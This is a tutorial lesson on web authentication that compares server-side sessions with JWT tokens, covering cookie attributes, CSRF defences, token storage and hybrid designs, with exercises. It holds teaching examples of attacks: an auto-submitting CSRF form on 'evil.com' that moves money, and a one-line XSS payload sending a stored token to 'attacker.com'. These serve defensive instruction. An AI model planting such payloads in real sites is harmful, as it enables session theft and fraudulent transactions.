# Lesson 3: Sessions vs Tokens

## The Problem: Keeping Users "Logged In"

HTTP is stateless. Every request is independent — the server has no built-in
way to know that request #47 and request #48 came from the same person. But
users expect to log in once and stay logged in. How do we bridge this gap?

There are fundamentally two approaches:

1. **Server-side sessions**: The server remembers who you are
2. **Stateless tokens**: The client carries proof of who they are

Both have strengths. Both have weaknesses. The right choice depends on your
system's constraints. Let's understand both deeply before comparing them.

---

## Server-Side Sessions

### How Sessions Work

```
1. User sends credentials (email + password)
2. Server verifies credentials
3. Server creates a session:
   - Generates a random session ID
   - Stores session data server-side: { userId: 42, role: 'admin', ... }
   - Sends the session ID to the client in a cookie
4. Client sends the session ID cookie with every subsequent request
5. Server looks up the session ID, retrieves the stored data
6. Server knows who the user is
```

```
  Client                              Server
    │                                    │
    │──── POST /login ──────────────────>│
    │     { email, password }            │
    │                                    │── Verify credentials
    │                                    │── Generate session ID: "abc123"
    │                                    │── Store: sessions["abc123"] = { userId: 42 }
    │<─── Set-Cookie: sid=abc123 ────────│
    │                                    │
    │──── GET /profile ─────────────────>│
    │     Cookie: sid=abc123             │
    │                                    │── Lookup sessions["abc123"]
    │                                    │── Found: { userId: 42 }
    │<─── { name: "Alice", ... } ────────│
```

### Session Storage

The session data needs to live somewhere. Options:

**In-memory (process memory):**
```typescript
// Simple but fragile
const sessions = new Map<string, SessionData>();
```
- Fast, simple
- Lost when server restarts
- Can't share across multiple server instances
- Memory grows with concurrent users

**Database (PostgreSQL, MySQL):**
```typescript
// Durable but slower
await db.query(
  'INSERT INTO sessions (id, user_id, data, expires_at) VALUES ($1, $2, $3, $4)',
  [sessionId, userId, JSON.stringify(data), expiresAt]
);
```
- Survives restarts
- Shareable across instances
- Slower (network round trip to DB)
- Need to clean up expired sessions

**Redis (most common in production):**
```typescript
// Fast, durable enough, built-in expiry
await redis.setex(`session:${sessionId}`, 3600, JSON.stringify(data));
```
- Very fast (in-memory with persistence options)
- Built-in TTL (expiry)
- Shareable across instances
- The standard choice for production session stores

### Implementing Sessions from Scratch

```typescript
import { randomBytes } from 'node:crypto';
import express from 'express';

interface Session {
  userId: string;
  role: string;
  createdAt: number;
  expiresAt: number;
}

// In production, this would be Redis
const sessionStore = new Map<string, Session>();

function createSession(userId: string, role: string): string {
  const sessionId = randomBytes(32).toString('hex');
  const now = Date.now();
  const ttl = 24 * 60 * 60 * 1000; // 24 hours

  sessionStore.set(sessionId, {
    userId,
    role,
    createdAt: now,
    expiresAt: now + ttl,
  });

  return sessionId;
}

function getSession(sessionId: string): Session | null {
  const session = sessionStore.get(sessionId);
  if (!session) return null;

  if (Date.now() > session.expiresAt) {
    sessionStore.delete(sessionId);
    return null;
  }

  return session;
}

function destroySession(sessionId: string): void {
  sessionStore.delete(sessionId);
}

const app = express();
app.use(express.json());

app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Verify credentials (simplified)
  const user = await verifyCredentials(email, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const sessionId = createSession(user.id, user.role);

  res.cookie('sid', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000,
  });

  res.json({ message: 'Logged in' });
});

app.post('/logout', (req, res) => {
  const sessionId = req.cookies?.sid;
  if (sessionId) {
    destroySession(sessionId);
  }
  res.clearCookie('sid');
  res.json({ message: 'Logged out' });
});
```

### Session Advantages

1. **Revocable**: Delete the session from the store, and the user is
   instantly logged out. No waiting for token expiry.

2. **Small cookie**: The session ID is just 32 random bytes. The actual
   data (roles, permissions, user info) stays server-side.

3. **Secure by default**: HttpOnly cookies can't be read by JavaScript.
   The session data never leaves the server.

4. **Mutable**: Need to update the user's role? Update the session store.
   The next request picks up the change.

### Session Disadvantages

1. **Stateful**: Requires a session store that all server instances can
   access. Adds infrastructure complexity.

2. **Latency**: Every request requires a round-trip to the session store
   (mitigated by using Redis).

3. **Scaling**: The session store becomes a potential bottleneck and single
   point of failure.

4. **CSRF vulnerability**: Cookies are sent automatically by the browser,
   which enables Cross-Site Request Forgery attacks.

---

## Cookies Deep Dive

Since sessions rely on cookies, you need to understand cookie security
attributes.

### The Attributes That Matter

```typescript
res.cookie('sid', sessionId, {
  httpOnly: true,     // JavaScript can't read this cookie
  secure: true,       // Only sent over HTTPS
  sameSite: 'lax',    // CSRF protection
  maxAge: 86400000,   // Expires in 24 hours
  domain: '.example.com',  // Shared across subdomains
  path: '/',          // Sent for all paths
});
```

**httpOnly**: This is your primary defense against XSS (Cross-Site
Scripting). If an attacker injects JavaScript into your page, they
can't access `document.cookie` to steal the session ID.

```javascript
// With httpOnly: true
document.cookie  // Does NOT include the session cookie
// The browser still sends it with requests, but JS can't read it

// With httpOnly: false (BAD)
document.cookie  // "sid=abc123" — XSS attacker steals this
```

**secure**: The cookie is only sent over HTTPS connections. Without this,
an attacker on the same WiFi network could sniff the cookie over HTTP.

**sameSite**: Controls when the cookie is sent on cross-origin requests.

```
sameSite: 'strict'
  - Cookie is NEVER sent on cross-origin requests
  - User clicks a link from email to your-site.com → not logged in
  - Most secure but can break legitimate flows

sameSite: 'lax'
  - Cookie sent on top-level navigations (clicking a link)
  - NOT sent on cross-origin POST, fetch, iframe, etc.
  - Good balance of security and usability

sameSite: 'none'
  - Cookie always sent (requires secure: true)
  - Only use if you need cross-site cookie access
  - Must pair with other CSRF defenses
```

### Cookie Scope

```
domain: '.example.com'
  - Cookie sent to example.com AND all subdomains
  - api.example.com, app.example.com, etc.

domain: 'app.example.com'
  - Cookie only sent to app.example.com

path: '/'
  - Cookie sent for all paths

path: '/api'
  - Cookie only sent for paths starting with /api
```

---

## Stateless Tokens (JWT Approach)

### How Tokens Work

Instead of storing session data on the server, we encode the data into a
token that the client holds.

```
1. User sends credentials
2. Server verifies credentials
3. Server creates a token containing user data, signs it
4. Server sends the token to the client
5. Client stores the token (where? we'll discuss this)
6. Client sends the token with every request (usually in a header)
7. Server verifies the signature — no database lookup needed
8. Server reads the user data directly from the token
```

```
  Client                              Server
    │                                    │
    │──── POST /login ──────────────────>│
    │     { email, password }            │
    │                                    │── Verify credentials
    │                                    │── Create token:
    │                                    │   { userId: 42, role: "admin",
    │                                    │     exp: 1234567890 }
    │                                    │── Sign token with secret key
    │<─── { token: "eyJhbG..." } ────────│
    │                                    │
    │──── GET /profile ─────────────────>│
    │     Authorization: Bearer eyJhbG...│
    │                                    │── Verify signature (no DB lookup)
    │                                    │── Read payload: { userId: 42, ... }
    │<─── { name: "Alice", ... } ────────│
```

### Token Advantages

1. **Stateless**: No session store needed. The server doesn't remember
   anything. This makes horizontal scaling trivial.

2. **Cross-domain**: Tokens work easily across different domains and
   services. A token issued by auth.example.com can be verified by
   api.example.com.

3. **Mobile-friendly**: Native mobile apps don't have cookies. Tokens
   in the Authorization header are natural.

4. **Microservice-friendly**: Each service can independently verify tokens
   using the shared secret or public key. No centralized session store.

### Token Disadvantages

1. **Not revocable**: Once issued, a token is valid until it expires. You
   can't "log out" a user instantly (without maintaining a blocklist, which
   defeats the stateless benefit).

2. **Large**: JWTs are much larger than a 32-byte session ID. Every request
   carries all the user's data.

3. **Stale data**: If you change a user's role, their token still has the
   old role until it expires.

4. **Storage dilemma**: Where does the client store the token?
   - `localStorage`: Accessible to JavaScript → XSS vulnerability
   - Cookies: Back to CSRF concerns
   - Memory: Lost on page reload

---

## Deep Comparison: When Sessions Beat Tokens

### Scenario 1: Traditional Web Application

A server-rendered web app with one backend. Sessions win because:
- You already have a database (session store is easy to add)
- Cookies work naturally with server-rendered pages
- You need instant logout capability
- The app lives on one domain

### Scenario 2: "Log Out Everywhere"

User changes their password and wants to invalidate all other sessions.
With sessions: delete all sessions for that user from the store.
With tokens: you can't. Unless you maintain a blocklist (which is a
session store with extra steps).

### Scenario 3: Sensitive Operations

Banking, healthcare, anything where you need to revoke access immediately.
Sessions win. If an account is compromised, you delete the session and
the attacker is locked out immediately.

---

## Deep Comparison: When Tokens Beat Sessions

### Scenario 1: Microservices

You have 20 services. Each needs to know who the user is. With sessions,
all 20 services need to query the session store. With tokens, each service
independently verifies the signature — no shared infrastructure.

### Scenario 2: Third-Party API

You're building an API that other developers will consume. They're not
using browsers — they're writing scripts, mobile apps, backend services.
Tokens in the Authorization header are the standard.

### Scenario 3: Single-Page Applications with Multiple Backends

An SPA talks to api.example.com and images.example.com and ws.example.com.
Cookies are scoped to domains. Tokens in headers work everywhere.

### Scenario 4: Offline-Capable Applications

A mobile app that needs to work offline. It can verify a token's signature
locally without a network request.

---

## CSRF Attacks with Sessions

### What Is CSRF?

Cross-Site Request Forgery exploits the fact that browsers automatically
send cookies with requests.

```
1. User logs into bank.com (has a session cookie)
2. User visits evil.com (in another tab)
3. evil.com contains:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker" />
     <input name="amount" value="10000" />
   </form>
   <script>document.forms[0].submit()</script>
4. Browser sends the POST to bank.com WITH the session cookie
5. bank.com sees a valid session and processes the transfer
```

The user never intended to make this request. But because cookies are
automatic, the server can't tell the difference.

### CSRF Mitigations

**1. SameSite Cookies (simplest)**

```typescript
res.cookie('sid', sessionId, {
  sameSite: 'lax',  // Blocks cross-origin POST requests
  // ...
});
```

With `sameSite: 'lax'`, the evil.com form submission won't include the
cookie. This is the first line of defense and should always be set.

**2. CSRF Tokens (defense in depth)**

```typescript
import { randomBytes } from 'node:crypto';

// Generate a CSRF token and store it in the session
app.get('/transfer-form', (req, res) => {
  const csrfToken = randomBytes(32).toString('hex');
  // Store in session
  req.session.csrfToken = csrfToken;

  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${csrfToken}" />
      <input name="to" />
      <input name="amount" />
      <button type="submit">Transfer</button>
    </form>
  `);
});

// Verify CSRF token on submission
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  // Process transfer...
});
```

evil.com can't read the CSRF token (it's embedded in a page on your
domain), so it can't include it in the forged request.

**3. Double-Submit Cookie Pattern**

```typescript
// Set a CSRF token in both a cookie AND require it in a header
// The cookie is sent automatically, but reading it requires same-origin JS

app.use((req, res, next) => {
  if (req.method === 'GET') {
    const token = randomBytes(32).toString('hex');
    res.cookie('csrf', token, { sameSite: 'strict' });
  }
  next();
});

app.post('/api/*', (req, res, next) => {
  const cookieToken = req.cookies.csrf;
  const headerToken = req.headers['x-csrf-token'];

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  next();
});
```

The attacker can trigger a request that sends the cookie, but they can't
read the cookie value (cross-origin) to set the header.

---

## Token Theft with JWTs

### The Storage Problem

Where should a client-side JavaScript application store a JWT?

**localStorage / sessionStorage:**
```javascript
// Easy to use
localStorage.setItem('token', jwt);

// Retrieve for API calls
fetch('/api/data', {
  headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
});
```

The problem: any JavaScript on the page can read localStorage. If your
app has an XSS vulnerability — even in a third-party script — the
attacker can steal the token:

```javascript
// XSS payload
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```

**HttpOnly Cookie:**

The token can't be read by JavaScript, but now you're back to CSRF
concerns and cookies being domain-scoped.

**In-memory (JavaScript variable):**

Safe from XSS persistence (the token isn't stored anywhere an attacker
can access after page reload), but the user loses their session on refresh.

### XSS Mitigation

The real fix is preventing XSS in the first place:

1. **Content Security Policy (CSP)**: Restrict which scripts can run
2. **Output encoding**: Always escape user-generated content
3. **Input validation**: Validate and sanitize all input
4. **Avoid `dangerouslySetInnerHTML`** and `eval()`

If you must store tokens client-side, combine multiple defenses:
- Short expiry on access tokens (5-15 minutes)
- Refresh tokens in HttpOnly cookies
- CSP headers
- Subresource integrity for third-party scripts

---

## Hybrid Approaches

The best real-world systems often combine both approaches.

### Pattern 1: JWT Access Token + Server-Side Refresh Token

```
Access Token:  JWT, stored in memory, expires in 15 minutes
Refresh Token: Opaque string, stored in HttpOnly cookie, tracked server-side
```

This gives you:
- Stateless verification for most requests (JWT)
- Revocability through the refresh token (server-side)
- Short window of vulnerability if a JWT is stolen (15 min)
- Automatic re-authentication via the refresh token

```
  Client                              Server
    │                                    │
    │── POST /login ────────────────────>│
    │                                    │── Verify credentials
    │                                    │── Create JWT (15 min expiry)
    │                                    │── Create refresh token
    │                                    │── Store refresh token in DB
    │<── { accessToken: "eyJ..." } ──────│
    │<── Set-Cookie: refresh=xxx ────────│
    │                                    │
    │── GET /api/data ──────────────────>│
    │   Authorization: Bearer eyJ...     │
    │                                    │── Verify JWT signature (no DB)
    │<── { data: [...] } ───────────────│
    │                                    │
    │   ... 15 minutes pass ...          │
    │                                    │
    │── GET /api/data ──────────────────>│
    │   Authorization: Bearer eyJ...     │
    │<── 401 Token Expired ──────────────│
    │                                    │
    │── POST /refresh ──────────────────>│
    │   Cookie: refresh=xxx              │
    │                                    │── Lookup refresh token in DB
    │                                    │── Valid? Create new JWT
    │                                    │── Rotate refresh token
    │<── { accessToken: "eyJ..." } ──────│
    │<── Set-Cookie: refresh=yyy ────────│
```

### Pattern 2: Session ID with Cached Data

```
Session cookie: session ID
Redis: session data (cached for performance)
Database: authoritative session record
```

Redis makes session lookup fast. The database provides durability. On cache
miss, load from database and re-cache.

### Pattern 3: Token-Based with Blocklist

```
Token: JWT (long-lived)
Redis: set of revoked token IDs
```

On each request, verify the JWT AND check if its `jti` (JWT ID) is in the
blocklist. This gives you stateless verification with revocation capability,
but the blocklist is a form of server-side state.

---

## Making the Decision: A Framework

Ask yourself these questions:

```
1. Is this a traditional web app or an API/SPA?
   Web app → Sessions (simpler, more secure by default)
   API/SPA → Tokens (more flexible)

2. Do you need instant revocation?
   Yes → Sessions or hybrid with server-side refresh tokens
   No  → Stateless tokens are fine

3. Is this a single service or distributed?
   Single → Sessions
   Distributed → Tokens (avoid shared session store)

4. Do you have Redis/similar infrastructure already?
   Yes → Sessions are easy to add
   No  → Tokens avoid new infrastructure

5. Are non-browser clients consuming this?
   Yes → Tokens (mobile apps, scripts, other services)
   No  → Either works

6. How sensitive is the data?
   Very → Sessions (instant revocation) or short-lived tokens
   Normal → Either works
```

For most modern applications, the **hybrid approach** (JWT access tokens +
server-side refresh tokens) is the best default. You get stateless
performance for the common case and revocability when you need it.

---

## Exercises

### Exercise 1: Build a Session Manager

Implement a complete session management system:
- `createSession(userId, data)` — returns session ID
- `getSession(sessionId)` — returns session data or null
- `updateSession(sessionId, data)` — updates session data
- `destroySession(sessionId)` — deletes the session
- `cleanExpiredSessions()` — removes all expired sessions

Use an in-memory Map. Add TTL support (sessions expire after a configurable
time). Write tests that verify expiry behavior.

### Exercise 2: Cookie Security Audit

Given this cookie configuration, identify all security issues:

```typescript
res.cookie('session', sessionId, {
  httpOnly: false,
  secure: false,
  sameSite: 'none',
  maxAge: 365 * 24 * 60 * 60 * 1000, // 1 year
});
```

List every problem, explain the attack it enables, and provide the
corrected configuration.

### Exercise 3: CSRF Attack Simulation

Build two Express servers:
1. "Bank" server (port 3000): Has a `/transfer` POST endpoint that checks
   for a session cookie. If the session is valid, it "transfers" money.
2. "Evil" server (port 3001): Serves a page with a hidden form that
   auto-submits a POST to localhost:3000/transfer.

First, demonstrate the CSRF attack working (without SameSite protection).
Then, add SameSite=Lax to the bank's cookie and show that the attack fails.

### Exercise 4: Token vs Session Performance

Write a benchmark that simulates:
1. **Session approach**: Create 10,000 sessions. Then perform 100,000
   lookups (simulating request authentication). Measure total time.
2. **Token approach**: Create 10,000 signed tokens (HMAC-SHA256). Then
   verify 100,000 tokens. Measure total time.

Compare the performance. Which is faster? Why? Would the results change
with Redis instead of an in-memory Map?

### Exercise 5: Design Document

Your team is building a health records application (HIPAA-compliant). Users
are doctors and patients. Write a 1-page design document recommending either
sessions, tokens, or a hybrid approach. Consider:
- Sensitivity of the data
- Need for instant revocation (doctor's access removed)
- Mobile app support
- Compliance requirements (audit logging of all sessions)
- Multi-hospital (multi-tenant) support

Justify every design choice.

---

## Summary

| Property | Sessions | Tokens (JWT) | Hybrid |
|----------|----------|-------------|--------|
| State | Server-side | Client-side | Both |
| Revocation | Instant | At expiry | Via refresh token |
| Scaling | Needs shared store | Stateless | Refresh token store |
| Size | Small cookie | Large token | Both |
| CSRF risk | Yes (cookies) | No (if in header) | Partial |
| XSS risk | Low (HttpOnly) | High (localStorage) | Moderate |
| Cross-domain | Hard | Easy | Moderate |

Next lesson: we'll build a JWT from absolute scratch to understand every
byte of how they work.
